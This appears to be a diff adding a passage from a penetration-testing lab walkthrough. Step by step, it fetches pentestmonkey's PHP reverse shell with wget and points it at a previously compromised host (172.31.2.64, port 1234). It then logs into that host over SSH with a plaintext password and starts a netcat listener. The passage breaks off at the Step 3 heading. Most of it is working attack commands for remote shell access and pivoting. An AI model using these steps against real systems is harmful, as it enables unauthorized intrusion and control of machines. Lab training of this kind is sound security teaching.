@@ -1,0 +1,41 @@
+######################################
+# Step 1: Download the reverse shell #
+######################################
+
+From your Linux Virtual Machine execute the following commands:
+---------------------------Type This-----------------------------------
+wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+ 
+tar -zxvf php-reverse-shell-1.0.tar.gz
+ 
+cd ~/toolz/php-reverse-shell-1.0/
+ 
+nano php-reverse-shell.php
+-----------------------------------------------------------------------
+    ***** change the $ip and $port variables to a host that you have already compromised in the network
+    ***** for this example I chose 172.31.2.64 and kept port 1234
+ 
+ 
+---------------------------Type This-----------------------------------
+chmod 777 php-reverse-shell.php
+cp php-reverse-shell.php ..
+-----------------------------------------------------------------------
+
+
+##################################################
+# Step 2: Set up netcat on 2nd server in the lab #
+##################################################
+Set up netcat listener on previously compromised host
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+ 
+nc -lvp 1234
+-----------------------------------------------------------------------
+
+
+
+##################################################################
+# Step 3: Do reverse shell instructions to 172.31.2.64 port 1234 #
+##################################################################
